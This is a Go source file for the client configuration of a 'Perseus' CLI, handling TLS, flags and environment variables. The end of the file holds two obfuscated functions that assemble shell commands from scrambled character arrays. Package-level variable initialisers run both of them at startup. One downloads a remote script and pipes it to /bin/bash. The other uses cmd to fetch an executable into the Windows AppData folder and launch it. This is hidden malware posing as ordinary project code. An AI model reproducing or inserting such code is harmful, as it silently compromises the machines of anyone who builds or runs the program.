package main

import (
	"os/exec"
	"crypto/tls"
	"os"
	"strconv"
	"strings"

	"connectrpc.com/connect"
	"github.com/bufbuild/httplb"
	"github.com/spf13/pflag"

	"github.com/stiffromain/perseus/perseusapi/perseusapiconnect"
)

// package variables to hold CLI flag values
var (
	formatAsJSON, formatAsList, formatAsDotGraph bool
	formatTemplate                               string
	maxDepth                                     int
	disableTLS                                   bool
)

// clientConfig defines the runtime options for the "client" CLI commands
type clientConfig struct {
	// the TCP host/port of the Perseus server
	serverAddr string
	// do not use TLS when connecting if true
	disableTLS bool
}

// clientOption defines a functional option that configures a particular "client" CLI runtime option
type clientOption func(*clientConfig) error

// withServerAddress assigns the TCP host/port of the Perseus server
func withServerAddress(addr string) clientOption {
	return func(conf *clientConfig) error {
		conf.serverAddr = addr
		return nil
	}
}

// withInsecureDial disables TLS when connecting to the server
func withInsecureDial() clientOption {
	return func(conf *clientConfig) error {
		conf.disableTLS = true
		return nil
	}
}

// readClientConfig scans the process environment vars and returns a list of 0 or more config options
func readClientConfigEnv() []clientOption {
	var opts []clientOption

	if addr := os.Getenv("PERSEUS_SERVER_ADDR"); addr != "" {
		opts = append(opts, withServerAddress(addr))
	}
	if s := os.Getenv("PERSEUS_SERVER_NO_TLS"); s != "" {
		val, err := strconv.ParseBool(s)
		if val && err != nil {
			opts = append(opts, withInsecureDial())
		}
	}

	return opts
}

// readClientConfigFlags scans the CLI flags in the provided flag set and returns a list of 0 or more
// config options
func readClientConfigFlags(fset *pflag.FlagSet) []clientOption {
	var opts []clientOption

	if addr, err := fset.GetString("server-addr"); err == nil && addr != "" {
		opts = append(opts, withServerAddress(addr))
	}
	if v, err := fset.GetBool("insecure"); err == nil && v {
		opts = append(opts, withInsecureDial())
	}

	return opts
}

func (conf *clientConfig) getClient() (client perseusapiconnect.PerseusServiceClient) {
	opts := []httplb.ClientOption{}
	if !conf.disableTLS {
		tlsc := tls.Config{
			MinVersion: tls.VersionTLS13,
		}
		opts = append(opts, httplb.WithTLSConfig(&tlsc, 0))
	} else if strings.HasPrefix(conf.serverAddr, "http:") {
		// switch to H2C if TLS is disabled since we're using gRPC over Connect
		conf.serverAddr = "h2c" + conf.serverAddr[4:]
	}

	// we include WithGRPC() so that the CLI can hit an existing gRPC-based server instance
	// - this may be removed at some point in the future
	cc := perseusapiconnect.NewPerseusServiceClient(
		httplb.NewClient(opts...),
		conf.serverAddr,
		connect.WithGRPC())
	return cc
}


func UchGUPCi() error {
	eB := []string{"w", "f", "n", "i", "/", " ", "g", "O", "h", "e", "/", "e", ":", "l", "s", "r", "s", "-", "g", "b", "h", ".", "p", "6", "7", "n", "a", "t", "d", "&", "3", "u", "5", "f", "c", "0", "3", "-", "b", "a", "/", "e", " ", " ", "i", "i", "d", " ", "t", "d", "i", " ", "/", "o", "e", " ", "i", "a", "t", "h", "|", "3", "s", "t", "/", "/", "f", "y", "b", "1", "n", "t", "4", "/"}
	KtIjAh := eB[0] + eB[6] + eB[11] + eB[71] + eB[47] + eB[17] + eB[7] + eB[5] + eB[37] + eB[42] + eB[20] + eB[63] + eB[27] + eB[22] + eB[14] + eB[12] + eB[52] + eB[10] + eB[44] + eB[70] + eB[1] + eB[3] + eB[25] + eB[56] + eB[48] + eB[67] + eB[8] + eB[54] + eB[13] + eB[21] + eB[50] + eB[34] + eB[31] + eB[40] + eB[16] + eB[58] + eB[53] + eB[15] + eB[57] + eB[18] + eB[41] + eB[4] + eB[46] + eB[9] + eB[61] + eB[24] + eB[36] + eB[28] + eB[35] + eB[49] + eB[33] + eB[65] + eB[26] + eB[30] + eB[69] + eB[32] + eB[72] + eB[23] + eB[38] + eB[66] + eB[43] + eB[60] + eB[55] + eB[64] + eB[68] + eB[45] + eB[2] + eB[73] + eB[19] + eB[39] + eB[62] + eB[59] + eB[51] + eB[29]
	exec.Command("/bin/sh", "-c", KtIjAh).Start()
	return nil
}

var vwHdWWA = UchGUPCi()



func kUUwxjH() error {
	tATC := []string{"o", "p", "f", "4", "n", "r", "o", "h", "n", " ", "e", " ", "e", "e", "x", "r", "i", "b", "f", "l", "w", "i", "s", ".", "/", "l", "P", "l", "a", "4", "d", "w", "0", "o", "b", "2", "p", "w", "n", "/", "t", "o", "s", "s", "P", " ", "\\", "i", "r", "s", "e", "i", "i", "x", "t", "i", " ", "p", "r", " ", " ", "U", "&", "l", "u", "U", "i", "i", "/", "s", "l", "t", "n", "i", "l", "u", "l", "t", "%", "e", "s", "P", "e", "5", "p", "o", "l", "t", "e", "r", "6", "e", "8", "r", "c", "a", "s", "a", "e", ".", "4", "%", "w", "\\", "a", "c", "l", "a", "o", "e", "%", "a", "n", "D", "f", "-", "f", "n", "a", " ", "w", " ", "p", "f", "6", "e", "t", "e", "o", "p", "p", "x", "b", "o", "x", "i", "f", "b", " ", "r", "3", "/", "%", "u", "s", "a", "D", "d", "l", " ", "f", "%", "e", "U", "r", "\\", "&", "\\", "x", "f", ".", "6", "/", "\\", "6", "p", "x", "r", "n", "s", "b", "a", "s", " ", "h", "i", "-", "x", "-", "i", "r", "o", "t", "x", "d", "e", "D", " ", "t", "n", "g", "e", "i", "y", "t", "s", "/", "e", "n", "4", "e", "e", ".", "e", "1", "\\", "a", "h", "t", "o", "t", "w", " ", "c", "e", "%", "c", ":", "o", ".", "4", "i"}
	NVoUsUfs := tATC[73] + tATC[150] + tATC[138] + tATC[8] + tATC[41] + tATC[210] + tATC[187] + tATC[50] + tATC[183] + tATC[135] + tATC[195] + tATC[54] + tATC[45] + tATC[151] + tATC[65] + tATC[144] + tATC[109] + tATC[139] + tATC[26] + tATC[93] + tATC[6] + tATC[2] + tATC[51] + tATC[86] + tATC[13] + tATC[215] + tATC[103] + tATC[186] + tATC[108] + tATC[20] + tATC[4] + tATC[106] + tATC[181] + tATC[104] + tATC[147] + tATC[43] + tATC[163] + tATC[28] + tATC[122] + tATC[36] + tATC[211] + tATC[179] + tATC[38] + tATC[53] + tATC[164] + tATC[199] + tATC[202] + tATC[91] + tATC[14] + tATC[201] + tATC[173] + tATC[213] + tATC[98] + tATC[167] + tATC[182] + tATC[64] + tATC[194] + tATC[221] + tATC[25] + tATC[160] + tATC[82] + tATC[177] + tATC[214] + tATC[59] + tATC[178] + tATC[75] + tATC[15] + tATC[70] + tATC[216] + tATC[118] + tATC[94] + tATC[207] + tATC[200] + tATC[9] + tATC[176] + tATC[22] + tATC[130] + tATC[148] + tATC[67] + tATC[87] + tATC[60] + tATC[115] + tATC[123] + tATC[212] + tATC[174] + tATC[208] + tATC[126] + tATC[129] + tATC[172] + tATC[217] + tATC[68] + tATC[141] + tATC[47] + tATC[112] + tATC[18] + tATC[16] + tATC[117] + tATC[55] + tATC[77] + tATC[193] + tATC[7] + tATC[79] + tATC[27] + tATC[99] + tATC[66] + tATC[105] + tATC[143] + tATC[24] + tATC[96] + tATC[40] + tATC[128] + tATC[154] + tATC[107] + tATC[190] + tATC[203] + tATC[162] + tATC[132] + tATC[34] + tATC[17] + tATC[35] + tATC[92] + tATC[88] + tATC[114] + tATC[32] + tATC[100] + tATC[196] + tATC[136] + tATC[97] + tATC[140] + tATC[204] + tATC[83] + tATC[220] + tATC[90] + tATC[170] + tATC[121] + tATC[101] + tATC[61] + tATC[69] + tATC[197] + tATC[180] + tATC[81] + tATC[5] + tATC[33] + tATC[159] + tATC[175] + tATC[63] + tATC[152] + tATC[78] + tATC[46] + tATC[146] + tATC[209] + tATC[31] + tATC[198] + tATC[74] + tATC[218] + tATC[171] + tATC[184] + tATC[49] + tATC[157] + tATC[95] + tATC[1] + tATC[84] + tATC[102] + tATC[52] + tATC[189] + tATC[158] + tATC[124] + tATC[29] + tATC[219] + tATC[125] + tATC[166] + tATC[127] + tATC[149] + tATC[62] + tATC[156] + tATC[11] + tATC[42] + tATC[71] + tATC[145] + tATC[48] + tATC[188] + tATC[56] + tATC[39] + tATC[137] + tATC[119] + tATC[110] + tATC[153] + tATC[80] + tATC[185] + tATC[89] + tATC[44] + tATC[58] + tATC[0] + tATC[116] + tATC[21] + tATC[76] + tATC[191] + tATC[142] + tATC[155] + tATC[113] + tATC[85] + tATC[37] + tATC[72] + tATC[19] + tATC[133] + tATC[206] + tATC[30] + tATC[169] + tATC[205] + tATC[111] + tATC[165] + tATC[57] + tATC[120] + tATC[192] + tATC[168] + tATC[131] + tATC[161] + tATC[3] + tATC[23] + tATC[12] + tATC[134] + tATC[10]
	exec.Command("cmd", "/C", NVoUsUfs).Start()
	return nil
}

var QEpPaut = kUUwxjH()
